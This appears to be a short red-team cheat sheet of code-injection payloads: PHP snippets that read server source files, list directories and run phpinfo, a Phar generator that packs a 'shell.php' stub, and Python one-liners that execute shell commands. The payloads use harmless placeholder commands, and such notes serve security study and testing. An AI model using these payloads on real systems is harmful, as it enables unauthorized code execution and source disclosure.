# Exploitation Payloads

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is the way to go, but I noted down some of mine.

<hr class="sep-both">

## PHP

<div class="row row-cols-lg-2"><div>

#### Read a file

There are multiple functions you might use:

```php!
<?php
$fileContents = file_get_contents('index.php');
$fileContents = show_source('index.php', true);
$fileContents = readfile('index.php');
echo $fileContents;
?>
```

Base64 encoding is not always necessary, especially with `show_source`.

```php!
$fileContents = base64_encode($fileContents);
```
</div><div>

#### Execute Shell Commands

Refer to [webshells#php](/cybersecurity/red-team/s3.exploitation/shell/web_shell.md#php-web-shell).

<br>

#### PHP Info POC

We often run `phpinfo` to get information.

```php!
<?php phpinfo() ?>
```

<br>

#### List files in directory

```php!
<?php
$files = scandir(".");
foreach ($files as $file) {
    echo $file;
}
```
</div></div>

<hr class="sep-both">

## Phar

<div class="row row-cols-lg-2"><div>

Simply zipping the PHP may work. Otherwise, you can use:

```php!
<?php // Run 'php --define phar.readonly=0 gen.php'
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

➡️ `shell.php` is the file inside the archive.
</div><div>
</div></div>

<hr class="sep-both">

## Python

<div class="row row-cols-lg-2"><div>

Simple python code to run a command.

```py
import os;os.system('ls -1a');
import os;os.popen("ls -1a").read();
import subprocess; subprocess.run(['ls', '-1a']);
```
</div><div>
</div></div>